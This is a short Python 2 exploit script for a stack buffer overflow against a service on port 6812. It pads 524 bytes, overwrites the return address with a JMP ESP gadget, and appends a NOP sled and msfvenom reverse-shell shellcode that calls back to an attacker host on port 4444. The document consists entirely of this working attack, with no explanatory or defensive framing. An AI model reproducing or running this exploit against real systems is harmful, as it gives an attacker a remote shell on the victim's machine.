import socket
import sys
import struct

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.x.x LPORT=4444 -b "\x00" -f py EXITFUNC=thread

buf =  b""
buf += b"\xd9\xc2\xbf\x4a\x42\x59\x04\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x12\x83\xeb\xfc\x31\x7b\x13\x03\x31\x51\xbb"
buf += b"\xf1\xf4\x8e\xcc\x19\xa5\x73\x60\xb4\x4b\xfd\x67\xf8"
buf += b"\x2d\x30\xe7\x6a\xe8\x7a\xd7\x41\x8a\x32\x51\xa3\xe2"
buf += b"\x04\x09\x62\x16\xec\x48\x85\xc7\xb1\xc5\x64\x57\x2f"
buf += b"\x86\x37\xc4\x03\x25\x31\x0b\xae\xaa\x13\xa3\x5f\x84"
buf += b"\xe0\x5b\xc8\xf5\x29\xf9\x61\x83\xd5\xaf\x22\x1a\xf8"
buf += b"\xff\xce\xd1\x7b"



host = sys.argv[1]

jmpesp = struct.pack("<I", 0x52501515)

buffer = "A" * 524 + jmpesp + "\x90" * 20 + buf + "\xff" * 200

z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

z.connect((host, 6812))

print "[*] Sending Payload"

z.send('%s\r\n' %buffer)

z.close()


